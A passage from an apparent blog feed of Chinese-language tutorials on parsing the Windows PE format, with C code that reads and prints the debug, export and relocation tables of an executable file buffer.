<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析其他表</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">DataTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">DataTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pExportDir <span class="token operator">=</span> pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_DEBUG<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"DEBUG RVA %08X\n DEBUG Size %08X\n"</span><span class="token punctuation">,</span> pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> pExportDir<span class="token operator">-></span>Size<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果-3"><a class="anchor" href="#运行结果-3">#</a> 运行结果：</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220301172228229.png" alt="image-20220301172228229" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件结构解析之导出表与重定位表结构解析</title>
    <url>/article/61ca529c.html</url>
    <content><![CDATA[<h1 id="导出表结构解析"><a class="anchor" href="#导出表结构解析">#</a> 导出表结构解析</h1>
<p>PE 编辑器中的导出表信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226190817553.png" alt="image-20220226190817553" /></p>
<p>VS 中导出表结构信息</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_EXPORT_DIRECTORY</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   Characteristics<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   TimeDateStamp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    WORD    MajorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    WORD    MinorVersion<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    DWORD   Name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    DWORD   Base<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    DWORD   NumberOfFunctions<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    DWORD   NumberOfNames<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    DWORD   AddressOfFunctions<span class="token punctuation">;</span>     <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    DWORD   AddressOfNames<span class="token punctuation">;</span>         <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    DWORD   AddressOfNameOrdinals<span class="token punctuation">;</span>  <span class="token comment">// RVA from base of image</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_EXPORT_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226190938370.png" alt="image-20220226190938370" /></p>
<h2 id="测试代码"><a class="anchor" href="#测试代码">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析导出表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">ExportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">ExportTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token comment">// 定位数据目录表中的导出表</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	PIMAGE_DATA_DIRECTORY pExportDir <span class="token operator">=</span> pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token comment">// 填充导出表结构</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	PIMAGE_EXPORT_DIRECTORY pExport <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> szName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>Name<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfFunctions <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前没有导出表！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">return</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"导出表的OFFSET：%08X\n"</span><span class="token punctuation">,</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExportDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"特征值：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Characteristics<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"基址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称OFFSET：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"名称：%s\n"</span><span class="token punctuation">,</span> szName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数数量：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>NumberOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名数量：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>NumberOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数地址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名称地址：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"函数名称序号：%08X\n"</span><span class="token punctuation">,</span> pExport<span class="token operator">-></span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	<span class="token comment">// 函数数量</span></pre></td></tr><tr><td data-num="31"></td><td><pre>	DWORD dwNumOfFun <span class="token operator">=</span> pExport<span class="token operator">-></span>NumberOfFunctions<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token comment">// 函数名数量</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	DWORD dwNumOfNames <span class="token operator">=</span> pExport<span class="token operator">-></span>NumberOfNames<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token comment">// 基址</span></pre></td></tr><tr><td data-num="35"></td><td><pre>	DWORD dwBase <span class="token operator">=</span> pExport<span class="token operator">-></span>Base<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>	<span class="token comment">// 导出地址表</span></pre></td></tr><tr><td data-num="37"></td><td><pre>	PDWORD pEat32 <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfFunctions<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	<span class="token comment">// 导出名称表</span></pre></td></tr><tr><td data-num="39"></td><td><pre>	PDWORD pEnt32 <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfNames<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>	<span class="token comment">// 导出序号表</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	PWORD pId <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pExport<span class="token operator">-></span>AddressOfNameOrdinals<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwNumOfFun<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>			<span class="token keyword">continue</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>		DWORD Id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> Id <span class="token operator">&lt;</span> dwNumOfNames<span class="token punctuation">;</span> Id<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>			<span class="token keyword">if</span> <span class="token punctuation">(</span>pId<span class="token punctuation">[</span>Id<span class="token punctuation">]</span> <span class="token operator">==</span> i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>			<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>				<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>			<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>Id <span class="token operator">==</span> dwNumOfNames<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="57"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Id：%x Address：0x%08X Name[NULL]\n"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> dwBase<span class="token punctuation">,</span> pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>		<span class="token keyword">else</span></pre></td></tr><tr><td data-num="61"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>			<span class="token keyword">char</span> <span class="token operator">*</span> szFunName <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pEnt32<span class="token punctuation">[</span>Id<span class="token punctuation">]</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Id：%x Address：0x%08X Name[%s]\n"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> dwBase<span class="token punctuation">,</span> pEat32<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>szFunName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果"><a class="anchor" href="#运行结果">#</a> 运行结果</h2>
<h3 id="无导出表测试结果"><a class="anchor" href="#无导出表测试结果">#</a> 无导出表测试结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226195202771.png" alt="image-20220226195202771" /></p>
<h3 id="有导出表测试结果"><a class="anchor" href="#有导出表测试结果">#</a> 有导出表测试结果</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220226195344675.png" alt="image-20220226195344675" /></p>
<h1 id="重定位表结构解析"><a class="anchor" href="#重定位表结构解析">#</a> 重定位表结构解析</h1>
<p>VS 中的重定位结构 <code>IMAGE_BASE_RELOCATION</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_BASE_RELOCATION</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    DWORD   VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    DWORD   SizeOfBlock<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">//  WORD    TypeOffset[1];</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span> IMAGE_BASE_RELOCATION<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED <span class="token operator">*</span> PIMAGE_BASE_RELOCATION<span class="token punctuation">;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220227115703323.png" alt="image-20220227115703323" /></p>
<ul>
<li>VirtualAddress：指向 PE 中需要重定向的 Rva</li>
<li>SizeOfBlock：体积总和</li>
</ul>
<p>lordPE 中重定位表</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220227121319288.png" alt="image-20220227121319288" /></p>
<h2 id="测试代码-2"><a class="anchor" href="#测试代码-2">#</a> 测试代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 解析重定位表的函数</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">RelocTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">void</span> <span class="token function">RelocTable</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token comment">// 定义结构</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_TYPE</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		WORD Offset <span class="token operator">:</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token comment">// 偏移</span></pre></td></tr><tr><td data-num="9"></td><td><pre>		WORD Type <span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token punctuation">&#125;</span>TYPE<span class="token punctuation">,</span><span class="token operator">*</span>PTYPE<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token comment">//Dos 头</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	PIMAGE_DOS_HEADER pDos <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token comment">//PE 头</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	PIMAGE_NT_HEADERS pNt <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pDos<span class="token operator">-></span>e_lfanew <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token comment">// 定位重定位表</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	PIMAGE_DATA_DIRECTORY pRelocDir <span class="token operator">=</span> <span class="token punctuation">(</span>pNt<span class="token operator">-></span>OptionalHeader<span class="token punctuation">.</span>DataDirectory <span class="token operator">+</span> IMAGE_DIRECTORY_ENTRY_BASERELOC<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">// 填充重定位表的结构</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	PIMAGE_BASE_RELOCATION pReloc <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_BASE_RELOCATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocDir<span class="token operator">-></span>VirtualAddress<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token comment">// 定位区段</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	PIMAGE_SECTION_HEADER pSection <span class="token operator">=</span> <span class="token function">IMAGE_FIRST_SECTION</span><span class="token punctuation">(</span>pNt<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token keyword">while</span> <span class="token punctuation">(</span>pReloc<span class="token operator">-></span>SizeOfBlock <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>		<span class="token comment">// 找到本 0x1000 个字节的起始位置</span></pre></td></tr><tr><td data-num="24"></td><td><pre>		DWORD dwCount <span class="token operator">=</span> <span class="token punctuation">(</span>pReloc<span class="token operator">-></span>SizeOfBlock <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		DWORD dwRva <span class="token operator">=</span> pReloc<span class="token operator">-></span>VirtualAddress<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>		<span class="token comment">// 数组节点</span></pre></td></tr><tr><td data-num="27"></td><td><pre>		PTYPE pRelocArr <span class="token operator">=</span> <span class="token punctuation">(</span>PTYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>pReloc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"区段：%s\n"</span><span class="token punctuation">,</span> pSection<span class="token operator">-></span>Name<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> dwRva<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"项目：%X H / %d D\n"</span><span class="token punctuation">,</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">,</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		<span class="token comment">// 找到下一个 0x1000 字节的结构体</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		pReloc <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_BASE_RELOCATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pReloc <span class="token operator">+</span> pReloc<span class="token operator">-></span>SizeOfBlock<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dwCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>			PDWORD pData <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span> <span class="token operator">+</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>			DWORD pDataOffset <span class="token operator">=</span> <span class="token function">RvaToOffset</span><span class="token punctuation">(</span>pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RVA：%08X\n"</span><span class="token punctuation">,</span> pRelocArr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Offset <span class="token operator">+</span> dwRva<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"区段：%08X\n"</span><span class="token punctuation">,</span> pData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"偏移：%08X\n\n"</span><span class="token punctuation">,</span> pDataOffset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="运行结果-2"><a class="anchor" href="#运行结果-2">#</a> 运行结果</h2>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220227123237585.png" alt="image-20220227123237585" /></p>
]]></content>
      <categories>
        <category>PE文件结构解析</category>
      </categories>
      <tags>
        <tag>PE文件结构解析</tag>
      </tags>
  </entry>
  <entry>
    <title>PE文件结构解析概述与MS-DOS和PE头解析</title>
    <url>/article/ac0ed2e7.html</url>
    <content><![CDATA[<p>路飞桑 yyds！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220213080423858.png" alt="image-20220213080423858" /></p>
<h2 id="概述"><a class="anchor" href="#概述">#</a> 概述</h2>
